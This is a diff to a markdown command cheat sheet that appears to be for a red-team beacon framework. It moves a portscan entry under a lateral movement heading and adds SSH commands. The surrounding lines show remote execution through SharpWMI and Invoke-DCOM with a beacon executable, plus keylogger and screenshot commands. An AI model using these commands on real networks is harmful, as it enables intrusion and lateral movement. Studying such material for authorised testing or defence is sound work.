@@ -65,11 +65,6 @@ screenwatch               Take periodic screenshots of desktop
 keylogger
 ```
 
-#### Portscan
-```
-portscan <CIDR> 139,445,3389,5985 none 1024
-```
-
 ### Webserver
 #### Upload file
 - Go to Site Management -> Host File and select your document.
@@ -263,6 +258,12 @@ connect localhost 4444
 ```
 
 ## Lateral Movement
+
+#### Portscan
+```
+portscan <IP OR RANGE> <PORTS>
+```
+
 ### User impersonation
 #### Make token - runas other user
 ```
@@ -438,6 +439,12 @@ execute-assembly SharpWMI.exe action=exec computername=<HOSTNAME> command="C:\Wi
 ```
 powershell-import Invoke-DCOM.ps1
 powershell Invoke-DCOM -ComputerName <HOSTNAME> -Method MMC20.Application -Command <BEACON EXE>
+```
+
+#### SSH
+```
+ssh
+ssh-key
 ```
 
 ## Post Exploitation
